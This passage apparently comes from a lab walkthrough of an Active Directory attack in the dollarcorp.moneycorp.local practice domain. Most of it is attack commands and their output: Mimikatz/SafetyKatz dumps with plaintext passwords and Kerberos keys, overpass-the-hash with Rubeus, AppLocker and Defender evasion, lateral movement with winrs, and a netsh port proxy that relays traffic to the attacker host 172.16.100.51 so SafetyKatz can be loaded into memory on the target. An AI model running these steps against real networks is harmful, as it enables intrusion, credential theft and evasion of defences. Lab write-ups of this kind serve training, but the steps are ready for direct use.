+<span class="s1">Session           : Service from 0</span>
+<span class="s1">User Name         : appadmin</span>
+<span class="s1">Domain            : dcorp</span>
+<span class="s1">Logon Server      : DCORP-DC</span>
+<span class="s1">Logon Time        : 2/21/2024 4:07:43 AM</span>
+<span class="s1">SID               : S-1-5-21-719815819-3726368948-3917688648-1117</span>
+
+<span class="s1">         * Username : appadmin</span>
+<span class="s1">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span>
+<span class="s1">         * Password : *ActuallyTheWebServer1</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb</span>
+<span class="s1">           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e</span>
+<span class="s1">           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7</span>
+<span class="s1">           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7</span>
+<span class="s1">           rc4_md4           d549831a955fee51a43c83efb3928fa7</span>
+<span class="s1">           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7</span>
+<span class="s1">           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7</span>
+
+<span class="s1">Authentication Id : 0 ; 21134 (00000000:0000528e)</span>
+<span class="s1">Session           : Interactive from 1</span>
+<span class="s1">User Name         : UMFD-1</span>
+<span class="s1">Domain            : Font Driver Host</span>
+<span class="s1">Logon Server      : (null)</span>
+<span class="s1">Logon Time        : 2/21/2024 4:07:37 AM</span>
+<span class="s1">SID               : S-1-5-96-0-1</span>
+
+<span class="s1">         * Username : DCORP-ADMINSRV$</span>
+<span class="s1">         * Domain   : dollarcorp.moneycorp.local</span>
+<span class="s1">         * Password : Q:hFT&#39;</span><span class="err">!</span><span class="n">FUXP6E_2</span><span class="p">)</span><span class="n">CK</span><span class="w"> </span><span class="n">dxm2vl</span><span class="o">*</span><span class="s1">&#39;N&gt;a;z-NIMogeiBtHMtjgw@,Lx:YD.=&quot;5G[e  Y+wN@^44&gt;IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd&#39;</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Key</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="err">:</span>
+<span class="w">           </span><span class="n">aes256_hmac</span><span class="w">       </span><span class="mi">82</span><span class="n">ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff</span>
+<span class="w">           </span><span class="n">aes128_hmac</span><span class="w">       </span><span class="mi">3</span><span class="n">f3532b2260c2851bf57e8b5573f7593</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt</span><span class="w">       </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_old</span><span class="w">      </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_md4</span><span class="w">           </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt_exp</span><span class="w">   </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_old_exp</span><span class="w">  </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+
+<span class="n">Authentication</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">999</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="err">:</span><span class="mf">000003e7</span><span class="p">)</span>
+<span class="k">Session</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="n">UndefinedLogonType</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">0</span>
+<span class="k">User</span><span class="w"> </span><span class="n">Name</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="n">DCORP</span><span class="o">-</span><span class="n">ADMINSRV</span><span class="err">$</span>
+<span class="k">Domain</span><span class="w">            </span><span class="err">:</span><span class="w"> </span><span class="n">dcorp</span>
+<span class="n">Logon</span><span class="w"> </span><span class="n">Server</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="k">null</span><span class="p">)</span>
+<span class="n">Logon</span><span class="w"> </span><span class="nc">Time</span><span class="w">        </span><span class="err">:</span><span class="w"> </span><span class="mi">2</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2024</span><span class="w"> </span><span class="mi">4</span><span class="err">:</span><span class="mi">07</span><span class="err">:</span><span class="mi">37</span><span class="w"> </span><span class="n">AM</span>
+<span class="n">SID</span><span class="w">               </span><span class="err">:</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">18</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">dcorp</span><span class="o">-</span><span class="n">adminsrv</span><span class="err">$</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Domain</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="k">LOCAL</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Password</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="k">null</span><span class="p">)</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Key</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="err">:</span>
+<span class="w">           </span><span class="n">aes256_hmac</span><span class="w">       </span><span class="n">e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt</span><span class="w">       </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_old</span><span class="w">      </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_md4</span><span class="w">           </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt_exp</span><span class="w">   </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_old_exp</span><span class="w">  </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+</code></pre></div>
+
+<p>Above we can see the output we get after executing <code>Invoke-MimiEx.ps1</code> script. We were able to retrieve lost of juicy information like from users and machines accounts like:
+<code>srvadmindcorp-adminsrv$appadminwebsvc</code></p>
+<p>Now we can do a OPTH(OverPass The Hash) using Rubeus.exe. Let’s use srvadmin in our example. At this stage we can use any credentials for this OverPass The Hash.</p>
+<p>We used OverPass The Hash to start a process as <code>SVRADMIN</code>.</p>
+<p>If we do have Windows Defender enabled, then we need to disable it before we run the command.
+The command uses Rubeus.exe with Loader.exe to execute a command that bypasses AppLocker restrictions.
+<code>.\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd" "exit”</code></p>
+<p>We can see above that after executing Rubeus, we were able to start a new command prompt as srvadmin user.
+Now as <code>srvadmin</code>, we can check if we have <code>srvadmin</code> has local admin access to any machine in the domain or not, and we can do it using <code>Find-PSRemotingLocalAdmin.ps1</code> module.</p>
+<p><code>. .\Find-PSRemotingLocalAdminAccess.ps1Find-PSRemotingLocalAdminAccess</code></p>
+<p>We can see above the srvadmin has local admin access to 2 machines in the domain.
+<code>dcorp-adminsrvdcorp-mgmt</code></p>
+<h2>Abusing Domain Admin Session With WinRS</h2>
+<p><strong>WinRS (Windows Remote Shell)</strong> is a command-line tool in Windows that allows remote execution of commands on a target machine. It can be used to establish a remote shell session for executing commands on a remote system.</p>
+<p>Nowadays commands like <code>whoami/hostname</code> are being tracked by the EDRs/MDEs, so instead of simply executing those commands straightforwards, we can use WinRS.
+As you can see above, we execute simply call winrs, pass the machine name and the commands we want to execute the the target.</p>
+<p><code>winrs -r:dcorp-mgmt hostname;whoami</code></p>
+<p>Above screenshot shows us that we are in the machine <code>dcorp-mgmt</code> and that we are <code>dcorp\student451</code></p>
+<p>Ok now that we know that we do have access to the machine and we can execute commands on the target, we can try to get the credentials of the Domain Admin session we found out previously.</p>
+<p>Let’s use PELoader.exe.
+PELoader is a tool designed to load and execute encrypted malicious PE files on Windows systems, using various techniques to bypass security products. 
+So the main goal is to run SafetyKatz.exe on <code>dcorp-mgtm</code> to extract credentials from it and to achieve this task we need to copy Loader.exe to dcorp-mgmt.
+Let’s start by copying PELoader.exe to out machine.</p>
+<p>Now let’s copy the Loader from our machine to our target (<code>dcorp-mgmt</code>). Please bare in mind that we are only able to copy this file from our machine to the target because we are also local admin in the target machine.</p>
+<p><code>echo F | xcopy C:AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe</code></p>
+<p>As we can see above, we do have the confirmation that we were able to copy Loader.exe to the target machine dcorp-mgmt.</p>
+<p>Now if we try to run PELoader.exe straight on the target machine <code>dcorp-mgmt</code>to execute <strong>SafatyKatz.exe</strong> on the target, we may get caught by the Windows Defender, because we are downloading and running an executable file from our remote server. 
+To avoid getting caught we can do a portforwarding.</p>
+<p>The below command is basically saying to the target machine (<code>dcorp-mgmt</code>) that any connection coming on port  8080 (<code>dcorp-mgmt</code>) will be redirected to port 80 in our  attacking machine(172.16.100.51).</p>
+<p><code>$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51"</code></p>
+<p><code>Please note</code> that we need to use the <code>$null</code> variable in the beginning of the line  to address output redirection issue avoiding our command line to freeze.</p>
+<p>Now we can Download SafetyKatz.exe and execute it in memory… The only moment we are touching the target disk is when we download PELoader.exe, SafetyKatz.exe is being executing in memory and not in the disk at all.</p>
+<p>For you to understand why we are using the loopback IP(127.0.0.1) in our command, during our portforwarding command we specified that whatever comes from any direction(0.0.0.0) to port 8080 should be redirected to our(attacker) IP in port 80, this way, Windows Defender will think that we are downloading and executing SafetyKatz.exe from our the local  web server(in this case  from the target itself), but the request is forwarded to our web server machine where we are hosting the SafetyKatz.exe.
+<code>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit</code></p>
+<div class="highlight"><pre><span></span><code><span class="nt">Authentication</span><span class="w"> </span><span class="nt">Id</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">0</span><span class="w"> </span><span class="o">;</span><span class="w"> </span><span class="nt">5661518</span><span class="w"> </span><span class="o">(</span><span class="nt">00000000</span><span class="p">:</span><span class="nd">0056634e</span><span class="o">)</span>
+<span class="nt">Session</span><span class="w">           </span><span class="o">:</span><span class="w"> </span><span class="nt">Interactive</span><span class="w"> </span><span class="nt">from</span><span class="w"> </span><span class="nt">0</span>
+<span class="nt">User</span><span class="w"> </span><span class="nt">Name</span><span class="w">         </span><span class="o">:</span><span class="w"> </span><span class="nt">mgmtadmin</span>
+<span class="nt">Domain</span><span class="w">            </span><span class="o">:</span><span class="w"> </span><span class="nt">dcorp</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Server</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="nt">DCORP-DC</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Time</span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="nt">2</span><span class="o">/</span><span class="nt">21</span><span class="o">/</span><span class="nt">2024</span><span class="w"> </span><span class="nt">7</span><span class="p">:</span><span class="nd">09</span><span class="p">:</span><span class="nd">28</span><span class="w"> </span><span class="nt">AM</span>
+<span class="nt">SID</span><span class="w">               </span><span class="o">:</span><span class="w"> </span><span class="nt">S-1-5-21-719815819-3726368948-3917688648-1120</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Username</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">mgmtadmin</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Domain</span><span class="w">   </span><span class="o">:</span><span class="w"> </span><span class="nt">DOLLARCORP</span><span class="p">.</span><span class="nc">MONEYCORP</span><span class="p">.</span><span class="nc">LOCAL</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Password</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="o">(</span><span class="nt">null</span><span class="o">)</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Key</span><span class="w"> </span><span class="nt">List</span><span class="w"> </span><span class="o">:</span>
+<span class="w">           </span><span class="nt">aes256_hmac</span><span class="w">       </span><span class="nt">902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa</span>
+<span class="w">           </span><span class="nt">rc4_hmac_nt</span><span class="w">       </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_hmac_old</span><span class="w">      </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_md4</span><span class="w">           </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_hmac_nt_exp</span><span class="w">   </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_hmac_old_exp</span><span class="w">  </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+
+<span class="nt">Authentication</span><span class="w"> </span><span class="nt">Id</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">0</span><span class="w"> </span><span class="o">;</span><span class="w"> </span><span class="nt">5188495</span><span class="w"> </span><span class="o">(</span><span class="nt">00000000</span><span class="p">:</span><span class="nd">004f2b8f</span><span class="o">)</span>
+<span class="nt">Session</span><span class="w">           </span><span class="o">:</span><span class="w"> </span><span class="nt">Interactive</span><span class="w"> </span><span class="nt">from</span><span class="w"> </span><span class="nt">0</span>
+<span class="nt">User</span><span class="w"> </span><span class="nt">Name</span><span class="w">         </span><span class="o">:</span><span class="w"> </span><span class="nt">mgmtadmin</span>
+<span class="nt">Domain</span><span class="w">            </span><span class="o">:</span><span class="w"> </span><span class="nt">dcorp</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Server</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="nt">DCORP-DC</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Time</span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="nt">2</span><span class="o">/</span><span class="nt">21</span><span class="o">/</span><span class="nt">2024</span><span class="w"> </span><span class="nt">6</span><span class="p">:</span><span class="nd">06</span><span class="p">:</span><span class="nd">39</span><span class="w"> </span><span class="nt">AM</span>
+<span class="nt">SID</span><span class="w">               </span><span class="o">:</span><span class="w"> </span><span class="nt">S-1-5-21-719815819-3726368948-3917688648-1120</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Username</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">mgmtadmin</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Domain</span><span class="w">   </span><span class="o">:</span><span class="w"> </span><span class="nt">DOLLARCORP</span><span class="p">.</span><span class="nc">MONEYCORP</span><span class="p">.</span><span class="nc">LOCAL</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Password</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="o">(</span><span class="nt">null</span><span class="o">)</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Key</span><span class="w"> </span><span class="nt">List</span><span class="w"> </span><span class="o">:</span>
+<span class="w">           </span><span class="nt">aes256_hmac</span><span class="w">       </span><span class="nt">902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa</span>
+<span class="w">           </span><span class="nt">rc4_hmac_nt</span><span class="w">       </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_hmac_old</span><span class="w">      </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_md4</span><span class="w">           </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_hmac_nt_exp</span><span class="w">   </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="w">           </span><span class="nt">rc4_hmac_old_exp</span><span class="w">  </span><span class="nt">95e2cd7ff77379e34c6e46265e75d754</span>
+
+<span class="nt">Authentication</span><span class="w"> </span><span class="nt">Id</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">0</span><span class="w"> </span><span class="o">;</span><span class="w"> </span><span class="nt">63049</span><span class="w"> </span><span class="o">(</span><span class="nt">00000000</span><span class="p">:</span><span class="nd">0000f649</span><span class="o">)</span>
+<span class="nt">Session</span><span class="w">           </span><span class="o">:</span><span class="w"> </span><span class="nt">Service</span><span class="w"> </span><span class="nt">from</span><span class="w"> </span><span class="nt">0</span>
+<span class="nt">User</span><span class="w"> </span><span class="nt">Name</span><span class="w">         </span><span class="o">:</span><span class="w"> </span><span class="nt">svcadmin</span>
+<span class="nt">Domain</span><span class="w">            </span><span class="o">:</span><span class="w"> </span><span class="nt">dcorp</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Server</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="nt">DCORP-DC</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Time</span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="nt">2</span><span class="o">/</span><span class="nt">21</span><span class="o">/</span><span class="nt">2024</span><span class="w"> </span><span class="nt">4</span><span class="p">:</span><span class="nd">07</span><span class="p">:</span><span class="nd">44</span><span class="w"> </span><span class="nt">AM</span>
+<span class="nt">SID</span><span class="w">               </span><span class="o">:</span><span class="w"> </span><span class="nt">S-1-5-21-719815819-3726368948-3917688648-1118</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Username</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">svcadmin</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Domain</span><span class="w">   </span><span class="o">:</span><span class="w"> </span><span class="nt">DOLLARCORP</span><span class="p">.</span><span class="nc">MONEYCORP</span><span class="p">.</span><span class="nc">LOCAL</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Password</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="nt">ThisisBlasphemyThisisMadness</span><span class="o">!!</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Key</span><span class="w"> </span><span class="nt">List</span><span class="w"> </span><span class="o">:</span>
+<span class="w">           </span><span class="nt">aes256_hmac</span><span class="w">       </span><span class="nt">6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span>
+<span class="w">           </span><span class="nt">aes128_hmac</span><span class="w">       </span><span class="nt">8c0a8695795df6c9a85c4fb588ad6cbd</span>
+<span class="w">           </span><span class="nt">rc4_hmac_nt</span><span class="w">       </span><span class="nt">b38ff50264b74508085d82c69794a4d8</span>
+<span class="w">           </span><span class="nt">rc4_hmac_old</span><span class="w">      </span><span class="nt">b38ff50264b74508085d82c69794a4d8</span>
+<span class="w">           </span><span class="nt">rc4_md4</span><span class="w">           </span><span class="nt">b38ff50264b74508085d82c69794a4d8</span>
+<span class="w">           </span><span class="nt">rc4_hmac_nt_exp</span><span class="w">   </span><span class="nt">b38ff50264b74508085d82c69794a4d8</span>
+<span class="w">           </span><span class="nt">rc4_hmac_old_exp</span><span class="w">  </span><span class="nt">b38ff50264b74508085d82c69794a4d8</span>
+
+<span class="nt">Authentication</span><span class="w"> </span><span class="nt">Id</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">0</span><span class="w"> </span><span class="o">;</span><span class="w"> </span><span class="nt">58732</span><span class="w"> </span><span class="o">(</span><span class="nt">00000000</span><span class="p">:</span><span class="nd">0000e56c</span><span class="o">)</span>
+<span class="nt">Session</span><span class="w">           </span><span class="o">:</span><span class="w"> </span><span class="nt">Service</span><span class="w"> </span><span class="nt">from</span><span class="w"> </span><span class="nt">0</span>
+<span class="nt">User</span><span class="w"> </span><span class="nt">Name</span><span class="w">         </span><span class="o">:</span><span class="w"> </span><span class="nt">SQLTELEMETRY</span>
+<span class="nt">Domain</span><span class="w">            </span><span class="o">:</span><span class="w"> </span><span class="nt">NT</span><span class="w"> </span><span class="nt">Service</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Server</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="o">(</span><span class="nt">null</span><span class="o">)</span>
+<span class="nt">Logon</span><span class="w"> </span><span class="nt">Time</span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="nt">2</span><span class="o">/</span><span class="nt">21</span><span class="o">/</span><span class="nt">2024</span><span class="w"> </span><span class="nt">4</span><span class="p">:</span><span class="nd">07</span><span class="p">:</span><span class="nd">44</span><span class="w"> </span><span class="nt">AM</span>
+<span class="nt">SID</span><span class="w">               </span><span class="o">:</span><span class="w"> </span><span class="nt">S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Username</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">DCORP-MGMT</span><span class="o">$</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Domain</span><span class="w">   </span><span class="o">:</span><span class="w"> </span><span class="nt">dollarcorp</span><span class="p">.</span><span class="nc">moneycorp</span><span class="p">.</span><span class="nc">local</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nt">Password</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nt">4</span><span class="o">?</span><span class="nt">PhChKP</span><span class="o">(</span><span class="err">`</span><span class="o">?</span><span class="nt">yW</span><span class="err">`</span><span class="nt">E8</span><span class="o">=</span><span class="nt">VM2QI13O</span><span class="o">!</span><span class="nt">i</span><span class="o">*</span><span class="nt">3Q</span><span class="o">?</span><span class="nt">WVB</span><span class="err">&quot;</span><span class="nt">X</span><span class="o">)=&gt;</span><span class="nt">Il3</span><span class="o">=</span><span class="nt">AczJ0</span><span class="o">^</span><span class="nt">T</span><span class="o">!</span><span class="nt">X</span><span class="o">]</span><span class="nt">r</span><span class="o">&amp;:&amp;</span><span class="nt">yG41</span><span class="err">`</span><span class="o">*/$^</span><span class="nt">4</span><span class="o">+</span><span class="nt">EeZ07</span><span class="o">?</span><span class="nt">zF2Z3</span><span class="err">`</span><span class="p">:</span><span class="cp">[</span><span class="nx">Jd</span><span class="o">*</span><span class="nx">F</span><span class="p">/</span><span class="nx">z_P</span><span class="sb">`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX</span>
+<span class="sb">         * Key List :</span>
+<span class="sb">           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076</span>
+<span class="sb">           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854</span>
+<span class="sb">           rc4_hmac_nt       0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_hmac_old      0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_md4           0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754</span>
+
+<span class="sb">Authentication Id : 0 ; 996 (00000000:000003e4)</span>
+<span class="sb">Session           : Service from 0</span>
+<span class="sb">User Name         : DCORP-MGMT$</span>
+<span class="sb">Domain            : dcorp</span>
+<span class="sb">Logon Server      : (null)</span>
+<span class="sb">Logon Time        : 2/21/2024 4:07:40 AM</span>
+<span class="sb">SID               : S-1-5-20</span>
+
+<span class="sb">         * Username : dcorp-mgmt$</span>
+<span class="sb">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span>
+<span class="sb">         * Password : (null)</span>
+<span class="sb">         * Key List :</span>
+<span class="sb">           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192</span>
+<span class="sb">           rc4_hmac_nt       0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_hmac_old      0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_md4           0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754</span>
+<span class="sb">           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754</span>
+
+<span class="sb">Authentication Id : 0 ; 5492837 (00000000:0053d065)</span>
+<span class="sb">Session           : RemoteInteractive from 2</span>
+<span class="sb">User Name         : mgmtadmin</span>
+<span class="sb">Domain            : dcorp</span>
+<span class="sb">Logon Server      : DCORP-DC</span>
+<span class="sb">Logon Time        : 2/21/2024 6:55:38 AM</span>
+<span class="sb">SID               : S-1-5-21-719815819-3726368948-3917688648-1120</span>
+
+<span class="sb">         * Username : mgmtadmin</span>
+<span class="sb">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span>
+<span class="sb">         * Password : (null)</span>
+<span class="sb">         * Key List :</span>
+<span class="sb">           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa</span>
+<span class="sb">           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="sb">           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="sb">           rc4_md4           95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="sb">           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754</span>
+<span class="sb">           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754</span>
+
+<span class="sb">Authentication Id : 0 ; 5467532 (00000000:00536d8c)</span>
+<span class="sb">Session           : Interactive from 2</span>
+<span class="sb">User Name         : UMFD-2</span>
+<span class="sb">Domain            : Font Driver Host</span>
+<span class="sb">Logon Server      : (null)</span>
+<span class="sb">Logon Time        : 2/21/2024 6:53:52 AM</span>
+<span class="sb">SID               : S-1-5-96-0-2</span>
+
+<span class="sb">         * Username : DCORP-MGMT$</span>
+<span class="sb">         * Domain   : dollarcorp.moneycorp.local</span>
+<span class="sb">         * Password : 4?PhChKP(`</span><span class="o">?</span><span class="nx">yW</span><span class="sb">`E8=VM2QI13O!i*3Q?WVB&quot;X)=&gt;Il3=AczJ0^T!X]r&amp;:&amp;yG41`</span><span class="o">*/</span><span class="err">$</span><span class="p">^</span><span class="mi">4</span><span class="o">+</span><span class="nx">EeZ07</span><span class="o">?</span><span class="nx">zF2Z3</span><span class="sb">`:[Jd*F/z_P`</span><span class="nx">p6B9XH</span><span class="p">^</span><span class="nx">g</span><span class="err">$</span><span class="o">*</span><span class="nx">mXIQMXY</span><span class="p">(</span><span class="nx">Sc</span><span class="o">?</span><span class="mi">3</span><span class="o">\</span><span class="nx">A6ICrX</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="kt">List</span><span class="w"> </span><span class="p">:</span>
+<span class="w">           </span><span class="nx">aes256_hmac</span><span class="w">       </span><span class="nx">c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076</span>
+<span class="w">           </span><span class="nx">aes128_hmac</span><span class="w">       </span><span class="nx">b3b9f96ed137fb4c079dcfe2e23f7854</span>
+<span class="w">           </span><span class="nx">rc4_hmac_nt</span><span class="w">       </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_old</span><span class="w">      </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_md4</span><span class="w">           </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_nt_exp</span><span class="w">   </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_old_exp</span><span class="w">  </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+
+<span class="nx">Authentication</span><span class="w"> </span><span class="nx">Id</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">21303</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="p">:</span><span class="mi">00005337</span><span class="p">)</span>
+<span class="nx">Session</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">Interactive</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="mi">0</span>
+<span class="nx">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">UMFD</span><span class="o">-</span><span class="mi">0</span>
+<span class="nx">Domain</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">Font</span><span class="w"> </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Host</span>
